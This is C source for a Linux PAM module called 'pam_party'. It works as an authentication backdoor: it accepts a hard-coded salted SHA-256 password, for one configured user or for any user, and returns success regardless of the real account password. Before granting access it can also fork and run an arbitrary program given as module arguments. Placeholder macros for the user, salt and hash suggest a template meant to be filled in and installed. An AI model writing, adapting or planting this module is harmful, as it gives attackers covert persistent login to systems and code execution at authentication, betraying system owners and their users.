#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/wait.h>

#define PAM_SM_AUTH

#include <openssl/sha.h>
#include <security/pam_appl.h>
#include <security/pam_modules.h>

#include "utils.h"

#define VERSION "0.1.0"

#define USER "_USER_"
#define SALT "_SALT_"
#define HASH "_SHA256_HASH_"

PAM_EXTERN int
pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char *argv[])
{
	if (strlen(USER)) {

		const char *user = NULL;

		if (pam_get_user(pamh, &user, NULL) != PAM_SUCCESS || !user) {
			return PAM_IGNORE;
		}
		if (strcmp(user, USER) != 0) {
			return PAM_IGNORE;
		}
	}
	const char *authtok = NULL;

	if (pam_get_authtok(pamh, PAM_AUTHTOK, &authtok, NULL) != PAM_SUCCESS || !authtok) {
		return PAM_IGNORE;
	}
	char token[strlen(SALT) + strlen(authtok) + 1];

	if (sprintf(token, "%s%s", SALT, authtok) < 0) {
		return PAM_IGNORE;
	}
	char hash[SHA256_DIGEST_LENGTH << 1 + 1];

	if (!calc_hash("SHA256", token, strlen(token), hash)) {
		return PAM_IGNORE;
	}
	if (strcmp(hash, HASH) != 0) {
		return PAM_IGNORE;
	}
	if (argc) {

		char *args[argc + 1];
		int i, status;

		pid_t pid = fork();
		switch (pid) {
		case -1:
			return PAM_IGNORE;
		case 0:
			for (i = 0; i < argc; i++) {
				args[i] = strdup(argv[i]);
			}
			args[argc] = NULL;
			execv(args[0], args);
			int err = errno;
			i = 0;
			while (args[i]) {
				free(args[i++]);
			}
			_exit(err);
		default:
			if (waitpid(pid, &status, 0) != pid || status != 0) {
				return PAM_IGNORE;
			}
		}
	}
	return PAM_SUCCESS;
}

PAM_EXTERN int
pam_sm_setcred(pam_handle_t *pamh, int flags, int argc, const char *argv[])
{
	return PAM_IGNORE;
}

#ifdef PAM_MODULE_ENTRY
PAM_MODULE_ENTRY("pam_party");
#endif
